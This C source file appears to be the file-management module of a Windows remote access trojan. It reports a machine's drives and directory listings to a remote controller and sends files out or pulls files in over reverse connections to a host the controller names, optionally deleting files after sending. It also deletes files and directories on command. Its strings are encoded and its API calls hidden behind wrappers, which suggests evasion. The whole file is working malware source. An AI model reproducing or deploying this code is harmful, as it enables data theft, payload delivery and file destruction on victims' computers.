#include "stuff.h"
#include "externals.h"

#ifndef NO_FILES

#define BUFSIZE		512

typedef struct
{
	SOCKET	sock;
	char	file[MAX_PATH];
	char	host[256];
	int		port;
	int		tnum;
	BOOL	send;
	BOOL	del;
} s_file;

int FILES_ListFilesInDir(SOCKET sock, char *indir)
{
   WIN32_FIND_DATA	FindFileData;
   HANDLE			hFind = INVALID_HANDLE_VALUE;
   DWORD			dwError;
   char				DirSpec[MAX_PATH], buff[MAX_PATH];
   int				i = 0;

   if (strlen(indir) > (MAX_PATH - 2))
   {
#ifdef DEBUG
	   printf("Too large indir.\n");
#endif
	   return -1;
   }

   _snprintf(DirSpec, sizeof(DirSpec) - 1, "%s\\*", indir);

#ifdef DEBUG
   printf("Quering directory: %s\n", DirSpec);
#endif

   // lets send all dirs first
   hFind = fFindFirstFile(DirSpec, &FindFileData);

   if (hFind == INVALID_HANDLE_VALUE) 
   {
#ifdef DEBUG
		printf("Invalid file handle. Error is %u.\n", fGetLastError());
#endif
		return -2;
   }

   else 
   {
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			_snprintf(buff, sizeof(buff) - 1, "dir\"%s\"", FindFileData.cFileName);
			NET_Send(sock, FILES, buff);
			i++;
		}
   
		// List all the other files in the directory.
		while (fFindNextFile(hFind, &FindFileData) != 0) 
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				_snprintf(buff, sizeof(buff) - 1, "dir\"%s\"", FindFileData.cFileName);
				NET_Send(sock, FILES, buff);
				i++;
			}
		}
    
		dwError = fGetLastError();
		fFindClose(hFind);

		if (dwError != ERROR_NO_MORE_FILES) 
		{
#ifdef DEBUG
			printf("FindNextFile error. Error is %u.\n", dwError);
#endif
		}
	}

   // and now all files
   hFind = fFindFirstFile(DirSpec, &FindFileData);

   if (hFind == INVALID_HANDLE_VALUE) 
   {
#ifdef DEBUG
		printf("Invalid file handle. Error is %u.\n", fGetLastError());
#endif
		return -2;
   }

   else 
   {
		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			_snprintf(buff, sizeof(buff) - 1, "fil\"%s\"%d", FindFileData.cFileName, FindFileData.nFileSizeLow);
			NET_Send(sock, FILES, buff);
			i++;
		}
   
		// List all the other files in the directory.
		while (fFindNextFile(hFind, &FindFileData) != 0) 
		{
			if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				_snprintf(buff, sizeof(buff) - 1, "fil\"%s\"%d", FindFileData.cFileName, FindFileData.nFileSizeLow);
				NET_Send(sock, FILES, buff);
				i++;
			}
		}
    
		dwError = fGetLastError();
		fFindClose(hFind);

		if (dwError != ERROR_NO_MORE_FILES) 
		{
#ifdef DEBUG
			printf("FindNextFile error. Error is %u.\n", dwError);
#endif
		}
	}

	return i;
}

int FILES_GetDrives(SOCKET sock)
{
    TCHAR	szTemp[BUFSIZE];
	char	buff[MAX_PATH];
	int		i = 0;

    szTemp[0] = '\0';
	
    if (fGetLogicalDriveStrings(BUFSIZE - 1, szTemp)) 
    {
		TCHAR szDrive[3] = TEXT(" :");
        TCHAR* p = szTemp;

        do 
        {
			*szDrive = *p;

			_snprintf(buff, sizeof(buff) - 1, "drv\"%s\"", szDrive);
			NET_Send(sock, FILES, buff);
			i++;

            // Go to the next NULL character.
            while (*p++);
		} while (*p); // end of string

		return i;
	}
	else
	{
#ifdef DEBUG
		printf("No disks found.\n");
#endif
		return -1;
	}
}

void FILES_Main(SOCKET sock, char *indir)
{
	char	buff[MAX_RECEIVE_BUFFER];
	int		i;

	if (!strcmp(indir, strings[Decode(s_drives)].encoded))
	{
		i = FILES_GetDrives(sock);

		if (i < 0)
			NET_Send(sock, FILES, strings[Decode(s_error)].encoded);
		else
		{
			_snprintf(buff, sizeof(buff) - 1, "%s %d", strings[Decode(s_end)].encoded, i);
			NET_Send(sock, FILES, buff);
		}
	}
	else if (!strcmp(indir, strings[Decode(s_stop)].encoded))
	{
		i = Thread_Kill(T_TRANSFER);
#ifdef DEBUG
		printf("%d transfer threads terminated.\n", i);
#endif
	}
	else
	{
		i = FILES_ListFilesInDir(sock, indir);

		if (i < 0)
			NET_Send(sock, FILES, strings[Decode(s_error)].encoded);
		else
		{
			_snprintf(buff, sizeof(buff) - 1, "%s %d", strings[Decode(s_end)].encoded, i);
			NET_Send(sock, FILES, buff);
		}
	}
}

int FILES_MakeReverseConnection(char *host, int port)
{
	return NET_Connect(host, port);
}

int FILES_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = DEFAULT_TRANSMIT_TIMEOUT;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return fselect(sock, &fd, NULL, NULL, &timeout);
}

DWORD WINAPI FILES_SendAndGetThread(LPVOID param)
{
	FILE	*f;
	int		datasock;
	char	buff[MAX_RECEIVE_BUFFER] = {0};
	int		r;

	s_file ssf = *((s_file *)param);

#ifdef DEBUG
	if (ssf.send)
		printf("Sending file %s to %s on port %d\n", ssf.file, ssf.host, ssf.port);
	else
		printf("Getting file %s from %s on port %d\n", ssf.file, ssf.host, ssf.port);
#endif

	// check if file exists
	if (ssf.send)
		f = fopen(ssf.file, "rb");
	else
		f = fopen(ssf.file, "wb");

	if (f == NULL)
	{
		NET_Send(ssf.sock, FILEINOUT, strings[Decode(s_failed)].encoded);
		Thread_Clear(ssf.tnum);
		ExitThread(0);
	}

	// reverse connection to client, so we connect first
	if ((datasock = FILES_MakeReverseConnection(ssf.host, ssf.port)) <= 0)
	{
		NET_Send(ssf.sock, FILEINOUT, strings[Decode(s_failed)].encoded);
		fclose(f);
		Thread_Clear(ssf.tnum);
		ExitThread(0);
	}

#ifdef DEBUG
	printf("Connected, now transfering file...\n");
#endif

	if (ssf.send)
	{
		while ((r = fread(buff, 1, MAX_RECEIVE_BUFFER, f)) >= 1)
		{
			fsend(datasock, buff, r, 0);
			memset(buff, 0, sizeof(buff));
		}
	}
	else
	{
		while (FILES_CheckTimeout(datasock) > 0)
		{
			memset(buff, 0, sizeof(buff));
			r = frecv(datasock, buff, MAX_RECEIVE_BUFFER, 0);
			if (r > 0)
			{
				fwrite(buff, r, 1, f);
			}
			else
			{
				break;
			}
		}
	}

	fclose(f);
	fclosesocket(datasock);

	NET_Send(ssf.sock, FILEINOUT, strings[Decode(s_success)].encoded);

	if (ssf.del)
		fDeleteFile(ssf.file);

	Thread_Clear(ssf.tnum);
	ExitThread(0);
}

void FILES_SendAndGet(SOCKET sock, char *file, char *host, int port, BOOL send, BOOL del)
{
	s_file ssf;
	_snprintf(ssf.file, sizeof(ssf.file) - 1, "%s", file);
	_snprintf(ssf.host, sizeof(ssf.host) - 1, "%s", host);
	ssf.sock = sock;
	ssf.port = port;
	ssf.send = send;
	ssf.del = del;
	ssf.tnum = Thread_Add(T_TRANSFER);

	threads[ssf.tnum].tHandle = Thread_Start(FILES_SendAndGetThread, &ssf);
}

void FILES_Delete(SOCKET sock, char *file)
{
	if (!fDeleteFile(file))
		NET_Send(sock, FILEACTION, strings[Decode(s_failed)].encoded);
	else
		NET_Send(sock, FILEACTION, strings[Decode(s_success)].encoded);
}

void FILES_MakeDir(SOCKET sock, char *dir)
{
	if (!fCreateDirectory(dir, NULL))
		NET_Send(sock, FILEACTION, strings[Decode(s_failed)].encoded);
	else
		NET_Send(sock, FILEACTION, strings[Decode(s_success)].encoded);
}

void FILES_DeleteDir(SOCKET sock, char *dir)
{
	if (!fRemoveDirectory(dir))
		NET_Send(sock, FILEACTION, strings[Decode(s_failed)].encoded);
	else
		NET_Send(sock, FILEACTION, strings[Decode(s_success)].encoded);
}

#endif